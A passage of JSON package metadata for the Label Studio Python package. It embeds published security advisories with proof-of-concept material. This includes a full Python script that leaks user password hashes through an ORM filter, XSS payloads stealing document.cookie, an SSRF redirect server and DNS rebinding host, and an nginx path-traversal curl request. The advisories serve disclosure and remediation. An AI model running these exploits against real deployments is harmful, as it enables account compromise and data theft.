filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.0.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.0.0/","requires_dist":["appdirs (==1.4.3)","attr (==0.3.1)","attrs (>=19.1.0)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","Django (==3.1.4)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.3.2)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","label-studio-converter (>=0.0.25)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (==0.12.2)","lxml (>=4.2.5)","moto (==1.3.16.dev122)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.8.4)","pydantic (==1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","pyyaml (>=5.3.1)","requests (<3,>=2.22.0)","rq (==1.7.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.0.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"f9e0196bbd336b67da8571e7beb0807d53c6658b3e05921a99b6d4898fcaf4ee","md5":"c528b97b598c81a8e5771d5b3083416f","sha256":"fb3c1675a9cfb3a8e330c416d3a04e1f4b1848f2ffd1a6a894605cf2cfebebbf"},"downloads":-1,"filename":"label_studio-1.0.0-py3-none-any.whl","has_sig":false,"md5_digest":"c528b97b598c81a8e5771d5b3083416f","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":47688733,"upload_time":"2021-03-16T16:43:21","upload_time_iso_8601":"2021-03-16T16:43:21.516514Z","url":"https://files.pythonhosted.org/packages/f9/e0/196bbd336b67da8571e7beb0807d53c6658b3e05921a99b6d4898fcaf4ee/label_studio-1.0.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"941073e150435c6aa882ff454362bfadbf484c85ebaa36b00ec112f237eb7594","md5":"f0b4a17873cc5bf7dbdb5c4e6f8a8965","sha256":"9361bfd3a84c7888df297a3ca710ac1792caf567a8c983f8531c203c66196a5c"},"downloads":-1,"filename":"label-studio-1.0.0.tar.gz","has_sig":false,"md5_digest":"f0b4a17873cc5bf7dbdb5c4e6f8a8965","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":46863990,"upload_time":"2021-03-16T16:43:31","upload_time_iso_8601":"2021-03-16T16:43:31.713207Z","url":"https://files.pythonhosted.org/packages/94/10/73e150435c6aa882ff454362bfadbf484c85ebaa36b00ec112f237eb7594/label-studio-1.0.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef 